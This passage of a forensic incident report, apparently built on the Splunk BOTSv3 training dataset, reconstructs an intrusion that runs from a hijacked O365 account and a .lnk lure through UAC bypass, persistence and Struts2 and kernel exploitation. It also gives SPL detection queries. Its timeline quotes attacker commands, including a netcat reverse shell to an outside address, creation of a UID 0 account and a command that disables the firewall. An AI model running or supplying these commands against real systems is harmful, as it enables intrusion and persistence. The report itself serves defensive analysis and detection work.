# Taedonggang Intrusion at Frothly Brewing Co. — Incident Report
Dataset: Splunk BOTSv3 · Incident date: 2018-08-20 (all times UTC)

This is the full incident analysis: attack chain, evidence, and coverage boundaries.

## The chain, in one line

```
🎣 Lure          💻 Foothold        🔓 Escalate         📌 Persist          🌐 Pivot            💥 Exploit          🔑 Root             📦 Collect
bgist hijacked → .lnk executes  →  UAC bypass on   →  scheduled task   →  scan 5 internal  →  Struts2 OGNL RCE →  useradd fails  →  tar archives
via O365           on FYODOR-L      FYODOR-L            hides payload      hosts, pick hoth     on hoth              → kernel exploit    files on
impossible                          (6 min in)          in the registry    (8080 = signal)                          → succeeds           FYODOR-L
travel                                                                                                                                    (11:52)
  §3.1              §3.2              §4.3                §4.5               §6                  §7.2                §7.3–7.7            §4.7
```

One C2 address, `45.77.53.176`, runs the whole thing: port 443 for the Windows implants, port 8088
for the Linux reverse shell. That single fact is what turns eight separate-looking events into one
actor's chain (§4.7, §5.3). Two hosts compromised, FYODOR-L and hoth; everyone else who touched the
lure clicked but never executed (§3.3).

---

## §0 Executive Summary

Between 10:01 and 11:52 UTC on 2018-08-20, a single threat actor established a foothold on a
corporate laptop at Frothly Brewing Co., escalated to administrative rights, created a backdoor
account, enumerated the internal server estate, and moved laterally to an internal Linux application
server, where a kernel exploit produced root access and a second backdoor account. Both halves of the
operation, Windows and Linux, reported to one C2 endpoint.

### Findings

The internal account `bgist@froth.ly` was hijacked using stolen credentials. An impossible-travel
sign-in from Hong Kong, 52 seconds after a legitimate Denver session, evidences the theft. The account
was then used to build a lure in its own OneDrive: three decoy beer photographs and a Windows shortcut
file, `BRUCE BIRTHDAY HAPPY HOUR PICS.lnk`, shared through an anonymous link.

FyodorMalteskesko downloaded the shortcut through Microsoft Edge. At 10:01:41 `browser_broker.exe`
handed the file to `powershell.exe` with no second user action, launching a PowerShell Empire stager
that began beaconing to 45.77.53.176:443 five seconds later.

Full reconstruction resolves this host's C2 traffic into five separate Empire sessions in three roles.
A base implant stays online throughout and does nothing but spawn elevated agents. Two elevated task
agents are each produced by a UAC bypass and discarded within seconds of finishing their work. Two
resident SYSTEM implants are delivered by a persistence mechanism and remain largely silent; one is
activated once, for data collection.

Within six minutes of the foothold the operator bypassed UAC via `fodhelper.exe` and used the
resulting elevated agent to create the local backdoor account `svcvnc` with the plaintext password
`Password123!`, register a scheduled task named `Updater` whose payload is staged in the registry, run
local and network reconnaissance, and disable the Windows Firewall on all three profiles. Once the
task had delivered a resident SYSTEM implant, the task itself was deleted. That deletion removed a
delivery vehicle whose payload was already resident in memory; it was not anti-forensic cleanup.

At 10:43:31 a bundled scanner, `hdoor.exe`, swept 192.168.9.0/24 from FYODOR-L's second interface and
enumerated six live hosts in 34 seconds. One of them, hoth, was then attacked with Struts2 OGNL RCE
(CVE-2017-5638). The first attempt to create a UID 0 account on hoth failed in the unprivileged Tomcat
service context. The operator staged, compiled and executed an eBPF kernel privilege escalation
(CVE-2017-16995), obtained a root shell, ran root-context reconnaissance for SuiteCRM and MySQL, and
re-issued the account creation successfully. A netcat reverse shell connected hoth back to the same
45.77.53.176 infrastructure on port 8088. A second such shell was established later from a second
elevated agent, spawned by a repeat of the identical UAC-bypass sequence. At 11:52:16 one of the
resident SYSTEM implants archived files on FYODOR-L with `tar`. This is the only data-collection
action evidenced in this report.

### Scope of impact

Two hosts were compromised. On FYODOR-L: initial access, execution, privilege escalation, backdoor
account, persistence, internal reconnaissance, data collection. On hoth: remote exploitation, kernel
privilege escalation, backdoor account, reverse shell.

A second user, `bstoll`, is **Confirmed** to have clicked and downloaded the lure twice. No execution
evidence exists on BSTOLL-L. `ghoppy` and `abungstein` show no participation evidence. Execution
evidence exists on exactly two hosts, so the affected-host count is two.

### Revised assessment

An earlier pass assessed the hoth backdoor account creation as likely failed, on a single-attempt
reading. Full reconstruction shows a two-stage sequence: failure under an unprivileged context, kernel
escalation, then success under root. This is the primary causal link in the Linux half of the
intrusion and is documented in §7.

A second result was unexpected. A `tomcat7` (UID 0) account already existed on hoth before the Struts2
chain began, created by a method that left no `useradd` record. It is identified and Parked as an
independent, earlier intrusion lead; it is not investigated in this report.

### Contributing weaknesses

The tooling is commodity and public throughout: PowerShell Empire, netcat, and a public
proof-of-concept for CVE-2017-16995. Six conditions are directly evidenced, and each is a detection or
hardening point on its own:

- a password committed to a process command line in plaintext (§4.4);
- a production web-service account with an unremoved compiler toolchain (§7.4);
- one external address terminating implants on two operating systems, and five Windows sessions across
  three privilege contexts (§4.7, §5.3);
- a scheduled-task persistence mechanism whose payload is staged in the registry, defeating a
  file-based indicator search, and whose delivery vehicle was deleted once the payload was resident
  (§4.5);
- a firewall disabled on all profiles nineteen minutes before lateral movement began (§4.6);
- standing SYSTEM-level access held for over a hundred minutes with no visible activity, used once for
  data collection (§4.7).

Each is verifiable from the section cited and is carried into a recommendation in §9 (this report) or
into the detection pack.

### Reading guide

| Section | Contents |
|------|----------|
| §1 | Scope, Data Sources & Methodology |
| §2 | Attack Chain Overview |
| §3 | Phase 1 — Initial Access |
| §4 | Phase 2 — Execution & Privilege Escalation (FYODOR-L) |
| §5 | Network Topology & Unified C2 |
| §6 | Internal Recon & Target Selection |
| §7 | Phase 3 — Lateral Movement & Post-Exploitation (hoth) |
| §8 | Evidence Coverage Boundaries & Unresolved Questions |
| §9 | Defensive Recommendations |
| §10 | Analytical Notes |

Deployable SPL detections, the IOC bundle, and the ATT&CK mapping are in the companion
[detection pack](../detection-pack.md). The earlier independent intrusion — the origin of the
pre-existing `tomcat7` (UID 0) account on hoth — is Parked (§8.4) and not analysed in this report.

---

## §1 Scope, Data Sources & Methodology

> **In one line:** what counts as proof in this report, and where this environment's data quirks
> could quietly break a query.

### 1.1 Scope

This analysis covers the intrusion into the Frothly Brewing Co. environment on 2018-08-20, from
initial delivery through post-exploitation on the internal application server `hoth`. It is
performed as a **threat hunt**: each phase begins from a stated objective and hypothesis, and every
technique attributed to the attacker is derived independently from telemetry. Attribution of
activity to a single actor is a *conclusion drawn from infrastructure and behavioural convergence*
(§5), not a premise.

In scope: FYODOR-L, hoth, the O365 tenant audit trail, and the network sessions between them.
Out of scope by deliberate choice: exhaustive analysis of every host in `192.168.9.0/24`, and
detection engineering for Linux and network-layer techniques (see §1.4).

### 1.2 Data sources

| Source | Sourcetype(s) | Role in this analysis |
|--------|---------------|------------------------|
| Windows endpoint | `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` | Process creation (EventID 1), network connections (EventID 3) — the backbone of Phases 1–2 |
| Windows security log | `WinEventLog:Security` | 4688 process creation, 4720/4732 account and group changes |
| Cloud collaboration | O365 management activity | `AnonymousLinkUsed` / file access on the SharePoint share |
| Network — application | `stream:http` | OGNL payloads in `form_data`, URI paths, response lengths |
| Network — transport | `stream:tcp` | Session-level reverse-shell volume and direction |
| Linux endpoint | `osquery:results` (`pack_process-monitoring`, `pack_fim_file_events`) | Process creation with `uid`/`euid`, file create/modify with hash and size |
| Linux system | `syslog`, `Unix:UserAccounts`, `Unix:ListeningPorts`, `Unix:Service`, `ps`, `top`, `lsof` | Authoritative account creation records, service context, process-tree snapshots |
| Linux shell history | `bash_history` (hoth) | 83 records, 11:06:55–13:33:30, fully bracketing the Phase 3 window — a source with confirmed coverage that records only legitimate administrative sessions (§8.2) |

Each source is used for what it can actually prove. Sysmon EventID 3 records connection *attempts*
at the process layer; `stream:tcp` records completed *sessions* at the session layer. The two will
disagree on counts, and both can be correct; this distinction matters in §5.

### 1.3 Methodology and environment discipline

Several environment-specific behaviours materially affect result correctness and are stated once
here.

On time: prose in this report quotes true UTC throughout, taken from the in-event `UtcTime` field
(or, for `stream:http`/`stream:tcp`, the `timestamp`/`signinDateTime` fields, which are already true
UTC). This Splunk account's **display** timezone is UTC-6: `_time`, and the `readable_time` derived
from it in every SPL query in this report, run six hours behind the UTC values the prose states. A
query window written to match this report's own UTC timestamps has to be shifted back six hours
before it will return anything — every SPL block in §3–§7 already reflects this shift; the note is
recorded once here rather than repeated at each block. Where `_time` and the in-event UTC field
diverge for a reason other than this display offset (observed in isolated events), the in-event field
is authoritative and `_time` is treated as index time. Time filtering is performed with
`| eval readable_time=strftime(_time,"%Y-%m-%d %H:%M:%S") | where readable_time>=…`, because direct
`_time` string comparison and `earliest=`/`latest=` returned empty result sets silently in this
environment.

On event ordering: events are ordered by authoritative event time, never by osquery batch `_time`,
since a single osquery collection batch shares one `_time`, and the order of arguments in a captured
`argv` array does not reflect the order or spacing of the original shell command line. Where
sub-second sequencing matters, `stream:http` and Sysmon timestamps arbitrate.

On field extraction: the Sysmon XML sourcetype has no automatic field extraction. `Image`,
`CommandLine`, `SourceIp` and similar fields must be extracted with `rex` from `_raw`. The extraction pattern must anchor on the closing quote of the attribute,
`"SourceIp'>(?<SourceIp>[^<]+)"`. Otherwise the literal `Name='SourceIp'` text earlier in the record interferes and the search
returns nothing *silently*. osquery events are JSON and are expanded with `| spath`
(`columns.cmdline`, `columns.euid`, `decorations.username`). The SPL shown at each finding in this
report omits this extraction step for readability and assumes it has already been applied (via a
field-extraction configuration or a preceding `rex` stage); it is a property of this dataset's raw
ingestion, not a general Splunk requirement, and should not be read as this analyst's default query
style.

A "no results" search is triaged, not concluded from: an empty result set is resolved into one of three
causes (extraction/quoting error, wrong time window, or a genuine coverage boundary) before any
negative finding is written down. Several apparent gaps in this investigation were quoting errors,
not missing data.

On behavioural layering, the following are treated as distinct, separately evidenced facts and are
never conflated: *click ≠ download ≠ execution*; *command issued ≠ command succeeded*;
*HTTP 200 ≠ command success*; *process created ≠ privilege changed* (escalation is proven only by a
child process's uid).

On noise: the Splunk forwarder's own telemetry collection runs as root and generates
high volumes of `sar`, `vmstat`, `ps` and similar processes on hoth. This is Splunk forwarder telemetry-collection noise, not attacker activity, discriminated by binary path (containing
`Splunk_ta_nix`), by `atime` (a fixed collection-time value versus a value adjacent to the observed
call), and by process-tree parentage. Separately, Linux recycles PIDs. Identical PID numbers hours
apart belong to unrelated processes, and no link in this report is made on PID number alone.

On baselining: BOTSv3 is an event-capture dataset, not a steady-state operational capture. Using it
as its own anomaly baseline for events inside the same capture would be circular, so no in-dataset
false-positive rate is claimed anywhere in this report. Where a detection would normally carry FP
tuning guidance, that limitation is stated explicitly rather than filled in with a fabricated number.

### 1.4 Detection engineering scope

Deployable SPL analytics are delivered for the Windows side (Phases 1-2) only, in the detection pack.
The Linux
post-exploitation chain (§7) receives full narrative and evidentiary analysis, and its high-value
detection opportunities are described, but no new numbered rules are issued for it. This is a
deliberate scope choice, made so that every delivered rule is one that has been reasoned through
end-to-end rather than sketched.

---

## §2 Attack Chain Overview

> **In one line:** the whole intrusion as a single paragraph, before the section-by-section
> evidence starts.

```
2018-08-20 (UTC)

 09:50:17      bgist@froth.ly signs in legitimately from Denver (157.97.121.5)
 09:51:09      bgist@froth.ly signs in from Hong Kong (104.207.83.63) — impossible travel
 09:56:58–     Lure built in bgist's OneDrive: decoy photos + .lnk uploaded, anonymous link
 09:58:02        created with permission inheritance broken
 10:01:33–41   FYODOR-L: FyodorMalteskesko downloads .lnk via Edge (Mark-of-the-Web tagged)
 10:01:41      .lnk → browser_broker.exe launches powershell.exe -enc <Empire stager>
 10:01:44      Stager re-invokes itself → session C300 (base implant, Medium integrity)
 10:01:46      C300 beacon established → 45.77.53.176:443   (1,123 beacons, to 11:59:36)
 ── escalation #1 ──────────────────────────────────────────────────────────
 10:07:03/04   whoami.exe /groups ×2 (C300) — privilege check
 10:07:05/06   fodhelper.exe at Medium, then at High — UAC bypass, auto-elevation visible
 10:07:06      Hijacked command loads payload from HKCU:\...\Windows Update, value Update
 10:07:08      → session C442 (elevated task agent) beacons  (694 beacons, to 11:13:57)
 ── C442 carries every operator action from here ───────────────────────────
 10:08:17      net user /add svcvnc Password123!
 10:08:35      net localgroup administrators svcvnc /add
 10:09:44      schtasks /Create "Updater" — registry-resident payload (HKLM:\...\Network, debug)
 10:11:00      Task Scheduler service auto-triggers the loader (not operator-driven)
 10:11:03      → session C52C (resident SYSTEM implant) beacons  (1,017 beacons, to 11:59:35)
 10:11:40      whoami.exe — SYSTEM context
 10:15:27      powershell -enc via WmiPrvSE.exe — trigger mechanism unresolved (Parked, §8)
 10:15:30      → session C637 (resident SYSTEM implant) beacons  (994 beacons, to 11:59:33)
 10:16:39      whoami.exe — High integrity (C442)
 10:16:54      schtasks /Delete /TN Updater /F — delivery vehicle removed; C52C still beaconing
 ── reconnaissance and defence degradation ─────────────────────────────────
 10:40:57      netstat -an
 10:41:46      netstat -an
 10:43:10      hdoor.exe -hbs 192.168.9.1-192.168.9.50 /b /m /n
 10:43:31–     → six live hosts enumerated in 34 seconds; hoth (192.168.9.30) selected
 10:44:05
 10:46:29      netsh advfirewall set allprofiles state off — all three profiles disabled
 10:47:06      single connection, session C442 → 45.77.53.176:3333 (one-off; purpose unresolved)
 ── lateral movement: every command below issued by iexeplorer.exe from C442 ─
 11:05:40      whoami          → hoth
 11:06:01      id              → hoth
 11:06:20      groups          → hoth
 11:06:38      cat /etc/passwd → hoth
 11:07:03      useradd -ou 0 -g 0 … tomcat7 -p davidverve.com — FAILS (uid 111 context)
 11:07:27      uname -a
 11:07:46      lsb_release -a
 11:08:36      echo <base64 colonel.c> >> /tmp/colonel
 11:09:48      echo <base64 JPEG image> — purpose not established (Parked, §8)
 11:10:13      ls -lf /tmp
 11:10:55      base64 --decode /tmp/colonel > /tmp/colonel.c
 11:11:27      cat /tmp/colonel.c        — operator self-verifies
 11:11:45      md5sum /tmp/colonel.c     — operator self-verifies
 11:12:51      mknod /tmp/backpipe p
 11:13:56      /bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe
 11:13:57      session C442 stops beaconing — one second after the reverse shell is established
 ── on hoth (osquery / syslog / top) ───────────────────────────────────────
 11:15:01      gcc colonel.c -o colonelnew
 11:16:58      colonelnew executed → root shell (uid=euid=0)
 11:21:56      Root-context recon: locate suitecrm / locate mysql
 11:24:44      useradd tomcat7 — SUCCEEDS (syslog: new user UID=0 GID=0)
 ── escalation #2, identical sequence to 10:07 ─────────────────────────────
 11:32:10/11   whoami.exe /groups ×2 (C300)
 11:32:12      fodhelper.exe at Medium, then at High
 11:32:16      → session D8AE (elevated task agent) beacons  (22 beacons, to 11:34:00)
 11:33:45      mknod /tmp/backpipe p (second construction)
 11:34:00      second reverse shell established; session D8AE stops beaconing the same second
 11:34:23      cleanmgr.exe /autoclean — native Windows SilentCleanup task, not attacker action (§4.7)
 11:34:49      colonelnew executed a second time (Parked, §8)
 11:41:33      netstat -nao | findstr LISTENING + wmic os get LocalDateTime — SYSTEM context (Parked, §8)
 ── collection ─────────────────────────────────────────────────────────────
 11:52:16      tar.exe -cvzf archive.tar *   — SYSTEM context, session C52C
 11:59:33–36   C637, C52C and C300 last observed beaconing (collection continues to 15:17; §4.7)
```

Phases 1 and 2 are detailed below. Phase 3, the topology that made lateral movement possible, and
the target-selection analysis are in §5–§7.

---

## §3 Phase 1 — Initial Access

> **In one line:** a hijacked internal account builds its own phishing lure, and one click on it
> is the entire foothold.

**Objective.** Establish how the first attacker-controlled code reached a Frothly endpoint, and
determine which users participated at each behavioural layer.

**Hypothesis.** Given a corporate O365 tenant and a Windows endpoint estate, the most probable
delivery path is a user-opened file obtained through a cloud-collaboration channel rather than a
direct network exploit — testable against the O365 audit trail and endpoint process telemetry.

### 3.1 Delivery: a hijacked internal account builds the lure

The lure was a Windows shortcut file, `BRUCE BIRTHDAY HAPPY HOUR PICS.lnk`, delivered through a
SharePoint anonymous sharing link published from the internal account `bgist@froth.ly`. I started
from the Azure AD sign-in log, not the lure itself, because a lure has to come from somewhere, and an
internal account is the more interesting question.

At **09:50:17**, `bgist@froth.ly` signed in successfully from `157.97.121.5` (Denver, Colorado) using
a normal browser fingerprint (Edge 17 on Windows 10). Fifty-two seconds later, at **09:51:09**, the
same account signed in successfully from `104.207.83.63` (**Hong Kong**) with the client string
`;;aBrowser 3.5;`, a near-empty user-agent that isn't a real browser identifier. That's what made me
stop: a Denver-to-Hong-Kong transition in under a minute isn't physically possible for one person, and
`aBrowser 3.5` is itself an odd fingerprint. The Hong Kong address authenticated against `bgist`
alone, no other account in the tenant, which told me this was targeted credential use, not password
spraying against the whole org.

This is the query that surfaces the pair: successive sign-ins for the same account are compared for
geographic distance and elapsed time, rather than filtered by a fixed IP or country list, so the
detection generalises to any future account and any future pair of source locations.

```spl
index=botsv3 sourcetype="ms:aad:signin"
| eval readable_time=strftime(_time, "%Y-%m-%d %H:%M:%S")
| spath input=_raw output=UserPrincipalName path=userPrincipalName
| spath input=_raw output=ClientIP path=ipAddress
| spath input=_raw output=DeviceInfo path=deviceInformation
| sort UserPrincipalName, _time
| streamstats current=f last(_time) as prev_time, last(ClientIP) as prev_IP by UserPrincipalName
| eval seconds_since_prior=round(_time-prev_time, 0)
| where seconds_since_prior<600 AND ClientIP!=prev_IP
| table readable_time, UserPrincipalName, prev_IP, ClientIP, seconds_since_prior, DeviceInfo
```

Run against this dataset's full day, the query returns ten pairs. Only one is the finding above:
`bgist@froth.ly`, 52 seconds, Denver to Hong Kong. The other nine are ordinary users switching
between a work laptop and a phone, or between home and office Wi-Fi, inside the 600-second window —
`fyodor@froth.ly` alone accounts for five of them, cycling between macOS/Safari and Windows/Chrome
throughout the day. A 600-second IP-change rule run with no further conditioning has a roughly 90%
false-positive rate in this environment. What separated the real finding from the other nine wasn't
the interval alone; it was the combination of interval, a `deviceInformation` string that doesn't
match any browser, and a single-account target — a detail worth stating rather than have the rule
imply an accuracy it doesn't have. The threshold and the device-string check both need tuning against
a real traffic baseline before deployment (see the detection pack).

From `104.207.83.63`, over the next six minutes, the session moved
through the Office 365 Portal, the O365 Suite UX, Exchange Online, Azure Portal and finally
SharePoint Online (09:51:09-09:56:36): a programmatic sweep of tenant services, not a human
clicking between six applications in that cadence.

From the same Hong Kong address, the
O365 management log records the entire lure being assembled inside `bgist`'s OneDrive in eighty-six
seconds:

```
09:56:58  FolderCreated      …/Documents/Birthday Pictures
09:57:17  FileUploaded       stout-2.jpg / morebeer.jpg / stout.png   (decoy images)
09:57:33  FileUploaded       BRUCE BIRTHDAY HAPPY HOUR PICS.lnk       (the payload)
09:58:02  AnonymousLinkCreated + SharingSet ×3 + SharingInheritanceBroken + AddedToGroup
```

One detail in this log is worth stating precisely rather than glossing over. From 09:56:38 onward,
the `User-Agent` recorded against every action in this sequence — the folder creation, the three
uploads, the file modifications — is `Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br)
Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4`. `ko-KP` is the locale code for Korean as
used in North Korea; `NaenaraBrowser` is the browser shipped with Red Star OS, North Korea's
state-produced operating system. This is a different string from the `;;aBrowser 3.5;` recorded at
the 09:51:09 sign-in nine minutes earlier — same account, same IP address, same continuous session,
different `User-Agent` value depending on which log records the action. What's Confirmed is narrow:
this specific, unusual string was sent, from this IP, for this account, during the lure construction.
What it does not establish is that the operator was actually running Red Star OS — a `User-Agent`
header is client-supplied and exactly as easy to fabricate as `aBrowser 3.5` already was two log
entries earlier, and this report does not have a way to distinguish a genuine Red Star OS client from
an operator who typed this string into a request by hand. Given the campaign name this investigation
was scoped under, the temptation to read this as attribution is real, and is exactly why it's flagged
as Indicative rather than folded into the Confirmed compromise narrative above. It's recorded here,
Parked, rather than left out or promoted past what it supports (§8.4).

The operator first uploaded three genuine beer photographs as camouflage, then dropped the malicious
`.lnk` into the same folder so that a casual look at the share showed party pictures. The 09:58:02
sequence (an anonymous link created, sharing set three times, and permission inheritance
deliberately broken) is the configuration required to make the link reachable by anyone regardless
of the parent folder's permissions. Every action in this reconstruction originates from
`104.207.83.63`.

Assessment: Confirmed. The `bgist` compromise is directly evidenced (impossible travel +
anomalous user agent + single-account targeting), and the lure construction is a continuous
attacker-controlled session in the O365 audit trail. This revises the earlier **High confidence**
assessment (compromise inferred, vector unknown) to **Confirmed with an established vector:
credential theft**. How the `bgist` credentials were obtained is the point *before* this one in the
chain and is not evidenced here; it is carried as a Parked lead in §8.

Between **09:59:04 and 10:01:13**, at least seven distinct
external IPs triggered `AnonymousLinkUsed` on the shared file. Attributing each of these to a
specific real recipient, a security gateway pre-fetching the URL, or the operator verifying the link
is possible but was not pursued; the endpoint-side evidence for the one access that mattered
(FYODOR-L, §3.2) stands independently and does not require it. This attribution is carried as Parked
in §8 rather than resolved by guesswork.

The choice of channel is the strategic point. An anonymous link from a legitimate internal account
inside the organisation's own tenant defeats sender-reputation, attachment-sandbox and external-domain
controls simultaneously, because at the moment of delivery nothing about the transaction is external.

**ATT&CK:** T1078 (Valid Accounts — the hijacked `bgist` identity) · T1534 / T1566.002 (internal
spearphishing via a shared link).

### 3.2 Download and execution on FYODOR-L

The delivery is recovered from Sysmon FileCreate (EventID 11) events on **FYODOR-L**, all under the
path `C:\Users\FyodorMalteskesko\…`, which fixes the operator of the endpoint directly rather than by
inference. The user retrieved the file through **Microsoft Edge**:

```
10:01:33  browser_broker.exe  → …\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.gapi8f2.partial
10:01:36  MicrosoftEdgeCP.exe → …\BRUCE BIRTHDAY HAPPY HOUR PICS (1).lnk.qy8e4dh.partial
10:01:38  browser_broker.exe  → …\BRUCE BIRTHDAY HAPPY HOUR PICS (1).lnk.qy8e4dh.partial:Zone.Identifier
10:01:41  browser_broker.exe  → …\BRUCE BIRTHDAY HAPPY HOUR PICS (1).lnk        (download completes)
```

Two download attempts appear in FileCreate telemetry, but only one — the `(1)`-suffixed copy —
carries a corresponding file-hash record (Sysmon EventID 15, SHA256 `7A1367EF…`) and reaches a
completed, non-`.partial` filename. The first attempt (10:01:33) never produces a matching hash
event, consistent with a download that was superseded or interrupted before completion. The `(1)`
suffix itself is Edge's standard handling of a repeated download request under the same name — not
evidence of two distinct payloads, but of one download that did not finish and one that did. The
**`:Zone.Identifier`** alternate data stream written at 10:01:38 is the Mark-of-the-Web tag Windows
applies to files from an untrusted zone — the marker that should have driven a SmartScreen or
open-file warning.

Execution here is process-chain confirmed, not merely time-adjacent: Sysmon EventID 1 for the two
`powershell.exe` process creations that follow gives the parent lineage directly:

```
10:01:41  powershell.exe   ParentImage: C:\Windows\System32\browser_broker.exe
                            ParentCommandLine: browser_broker.exe -Embedding
                            CommandLine: powershell -noP -sta -w 1 -enc <Base64 stager>

10:01:44  powershell.exe   ParentImage: the 10:01:41 powershell.exe itself
                            ParentCommandLine / CommandLine: byte-identical to 10:01:41
```

The `.lnk` was executed by `browser_broker.exe`, the Windows process that hosts UWP/sandboxed
component handlers including part of Edge's post-download processing, not by a user
double-clicking the file through `explorer.exe`. This is a materially stronger finding than a
double-click: it means no further user decision existed between the download completing and the
payload running. The Mark-of-the-Web tag was written three seconds before the download finished and
did not prevent this handoff.

The second `powershell.exe` at 10:01:44 is not an independent trigger; its parent is the first
`powershell.exe`, and its command line is identical to it: the stager re-invoking itself, a pattern
consistent with PowerShell Empire's launcher behaviour. Both process creations are treated as one
execution event in this report, not two.

The user context throughout is `AzureAD\FyodorMalteskesko`. The `.lnk` file type is itself the tell:
a shortcut is not a picture, and a shortcut whose target is an encoded PowerShell command line has
exactly one purpose.

Assessment: Confirmed. Delivery is evidenced in the O365 audit trail (§3.1); download, the
Mark-of-the-Web marking, and execution are evidenced in endpoint FileCreate and process-creation
telemetry with full parent-process lineage — independent sources agreeing on user, host, second, and
causal chain.

### 3.3 Victim scope: three behavioural layers, separately evidenced

The lure reached more than one recipient, and the distinction between *reached*, *acted on*, and
*compromised* is where a shallow reading of this data goes wrong.

| User / host | Clicked | Downloaded | Executed | Assessment |
|-------------|---------|------------|----------|------------|
| FyodorMalteskesko / **FYODOR-L** | Yes | Yes | **Yes** | **Confirmed compromised** |
| bstoll / BSTOLL-L | Yes (×2) | Yes (×2) | No evidence | Interacted, **not** compromised |
| ghoppy | — | — | — | No participation evidence |
| abungstein | — | — | — | No participation evidence |

`bstoll` clicked and downloaded the lure twice, which in an incident-response context is
indistinguishable from Fyodor's behaviour up to that point. Yet BSTOLL-L shows no execution,
no child process, no outbound beacon, and no subsequent attacker activity of any kind. Reporting
BSTOLL-L as compromised on the strength of a download would inflate the incident scope by fifty
percent. Affected-host count: two. Process-execution evidence exists on exactly two hosts.

For `ghoppy` and `abungstein`, the correct statement is *no participation evidence*, which is not
the same as *proof of non-participation*; the O365 and endpoint sources covering them are the same
sources that captured the other two users, so the absence is meaningful, but it is an absence.

**ATT&CK:** T1204.002 (User Execution: Malicious File) — the delivery and valid-account techniques
are mapped in §3.1.

---

## §4 Phase 2 — Execution & Privilege Escalation (FYODOR-L)

> **In one line:** six minutes from first execution to admin, using a UAC bypass and a persistence
> mechanism that leaves nothing on disk.

**Objective.** Reconstruct what the attacker did on FYODOR-L between the initial execution and the
first outbound lateral movement, in sequence, with the privilege state at each step.

**Hypothesis.** A `.lnk`-delivered encoded PowerShell command is characteristic of a staged C2
framework rather than self-contained malware; if so, the endpoint should show a short stager
followed immediately by regular, low-jitter outbound connections from the same process.

### 4.1 The PowerShell Empire stager

At **10:01:41**, `powershell.exe` was launched with the flag combination
`-NoP -NonI -W Hidden -enc <Base64>`. The decoded stager contains an **AMSI bypass** and code that
**disables ScriptBlockLogging** — that is, the payload's first act is to blind two of the exact
telemetry sources a defender would use to inspect it.

This flag pattern (`-NoP -NonI -W Hidden -enc`) is the canonical PowerShell Empire launcher
signature, and it is a strong, low-cost detection primitive precisely because legitimate
administrative PowerShell rarely combines *all four*. The corresponding analytic is delivered in the
detection pack.

**Assessment: Confirmed** (Sysmon EventID 1 with full command line, corroborated by Security 4688).

### 4.2 C2 beacon establishment

The stager's first outbound connection was recorded at **10:01:46** — five seconds after process
creation. The cadence is distinctive:

- Three connections at **one-second** intervals (10:01:46 / :47 / :48), consistent with initial
  handshake or retry;
- then convergence to a stable **5–6 second** beacon interval, sustained without meaningful jitter;
- **1,123 beacons** to `45.77.53.176:443` from this process, first observed 10:01:46 and last
  observed 11:59:36 — 118 minutes;
- `Image` is `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` and `User` is
  `AzureAD\FyodorMalteskesko` throughout, at **Medium** integrity.

```spl
index=botsv3 host=FYODOR-L sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
| eval readable_time=strftime(_time, "%Y-%m-%d %H:%M:%S")
| where readable_time>="2018-08-20 04:00:00" AND readable_time<="2018-08-20 05:05:00"
| rex field=_raw "<EventID>(?<EventID>\d+)</EventID>"
| rex field=_raw "Name='SourceIp'>(?<SourceIp>[^<]+)"
| rex field=_raw "Name='DestinationIp'>(?<DestinationIp>[^<]+)"
| rex field=_raw "Name='Image'>(?<Image>[^<]+)"
| rex field=_raw "Name='User'>(?<User>[^<]+)"
| where EventID="3" AND SourceIp="192.168.70.186" AND DestinationIp="45.77.53.176"
| table readable_time, Image, User
| sort readable_time
```

Two environment quirks are folded into this query and worth stating once, here, rather than
repeating at every SPL block in this report. First, `readable_time` above is six hours behind the
`UtcTime` this report's prose quotes throughout — this Splunk account's display timezone is UTC-6, so
a query window stated in this report's own UTC timestamps has to be shifted back six hours to match
what the search bar will actually return; every timestamp in the prose itself remains true UTC.
Second, the Sysmon XML sourcetype has no automatic field extraction, so `EventID`, `SourceIp`,
`DestinationIp`, `Image` and `User` are pulled from `_raw` with `rex` rather than referenced directly;
`EventID` sits in a plain `<EventID>3</EventID>` tag while the rest are `<Data Name='X'>` attributes,
which is why they need two different regex shapes. Every Sysmon-sourced query in this report follows
both conventions even where not repeated verbatim.

This process is the base implant, and it is not where the operator worked. Session C300 (this
`ProcessGuid`) runs for the full observed window and issues no command of its own beyond two
privilege checks and two `fodhelper.exe` invocations (§4.3, §4.7). Its function is to stay alive and
spawn elevated agents. Every action attributed to the operator in the remainder of this phase —
account creation, persistence, reconnaissance, firewall modification, and every command executed
against `hoth` — issues from the elevated agents it spawns, not from this process.

Aggregate beacon counts on this host have to be qualified by both the process and the time window,
and I learned that the hard way. My first pass through this data counted 2,074 connections to
`45.77.53.176` in a 10:00–11:05 window and attributed all of them to this one user-context session,
concluding it never migrated to a SYSTEM process. I'm withdrawing that. The 2,074 figure was the sum
of four concurrent sessions, not one, and the window's upper bound had truncated a further 1,776
connections and a fifth session entirely out of view. Widening the window and splitting by
`ProcessGuid` instead of just counting connections to the IP is what actually fixed it: five sessions,
3,850+ beacons across 09:00–18:00, three distinct roles. That's the full picture in §4.7. I think the
mistake itself is worth walking through, not just the correction, so it's examined in §10.

In the same window the only other outbound destinations from this interface are three connections
to `13.82.88.224`, one to `13.91.94.12` and one to `52.160.42.250`: Microsoft Defender and cloud
lookup traffic. The ratio is the point: across 09:00–18:00, this interface produced **3,850+
connections to a single C2 address against five to legitimate Microsoft endpoints**. A beacon this
regular is trivially visible *if* the analytic is behavioural (interval regularity, per process)
rather than reputational, because at the time of the incident `45.77.53.176` carried no reputation
signal at all.

This beacon shares egress interface and destination port (443) with legitimate Microsoft cloud
traffic, a detection blind spot examined in §5, where the host's dual-homed topology is analysed.

**Assessment: Confirmed.**

**ATT&CK:** T1059.001 (PowerShell) · T1027 (Obfuscated Files or Information) ·
T1562.001 (Impair Defenses: Disable or Modify Tools) · T1071.001 / T1573 (Application Layer Protocol
over an encrypted channel).

### 4.3 UAC bypass via fodhelper.exe — and what it actually produced

At **10:07:03–10:07:04** the base implant (session C300) ran `whoami.exe /groups` twice — a
privilege check immediately preceding the escalation attempt. One second later the bypass executed.

```
10:07:03  whoami.exe /groups         Medium   parent: powershell.exe (C300)
10:07:04  whoami.exe /groups         Medium   parent: powershell.exe (C300)
